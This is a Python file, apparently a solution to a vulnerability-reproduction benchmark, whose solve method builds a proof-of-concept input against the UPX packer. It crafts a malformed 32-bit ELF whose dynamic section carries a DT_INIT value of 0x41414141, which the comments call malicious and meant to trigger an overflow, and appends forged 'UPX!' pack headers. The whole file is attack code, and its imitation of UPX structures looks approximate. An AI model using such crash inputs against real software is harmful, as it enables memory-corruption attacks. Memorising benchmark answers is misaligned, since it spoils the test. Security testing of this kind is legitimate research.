import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # ELF Header (32-bit LE)
        # e_ident: Magic(4), Class(1=32), Data(1=LE), Version(1), ABI(0)...
        e_ident = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # e_type(2=EXEC), e_machine(3=386), e_version(1)
        e_half_word = struct.pack('<HH I', 2, 3, 1)
        
        # e_entry, e_phoff(52), e_shoff(0)
        e_offsets = struct.pack('<I I I', 0x08048000, 52, 0)
        
        # e_flags, e_ehsize(52), e_phentsize(32), e_phnum(1), e_shentsize(40), e_shnum(0), e_shstrndx(0)
        e_sizes = struct.pack('<I HHH HHH', 0, 52, 32, 1, 40, 0, 0)
        
        elf_header = e_ident + e_half_word + e_offsets + e_sizes
        
        # Program Header (PT_DYNAMIC)
        # Maps a segment containing the Dynamic Section
        # We place the dynamic section right after the headers.
        ph_offset = 84
        ph_vaddr = 0x08048000 + ph_offset
        
        # p_type(2=DYNAMIC), p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags(6=RW), p_align(4)
        phdr = struct.pack('<I I I I I I I I', 2, ph_offset, ph_vaddr, ph_vaddr, 16, 16, 6, 4)
        
        # Dynamic Section
        # DT_INIT (12), value = 0x41414141 (Malicious offset/value triggering overflow)
        # DT_NULL (0)
        dyn = struct.pack('<I I', 12, 0x41414141) + struct.pack('<I I', 0, 0)
        
        # Construct base ELF
        payload = elf_header + phdr + dyn
        
        # Pad payload to be somewhat substantial (256 bytes) to accommodate UPX checks/offsets
        payload += b'\x00' * (256 - len(payload))
        
        # UPX Pack Header / Info construction
        # Mimic PackLinuxElf structures
        
        # p_info (12 bytes)
        # p_progid, p_filesize, p_blocksize
        p_info = struct.pack('<III', 0, len(payload), len(payload))
        
        # l_info (12 bytes)
        # Magic(4), Conf(1), Method(1), Level(1), Version(1), Size(4)
        # Magic = 'UPX!'
        l_info = b'UPX!' + struct.pack('<BBBB', 0, 0, 0, 13) + struct.pack('<I', len(payload))
        
        # Combine to form PoC
        return payload + p_info + l_info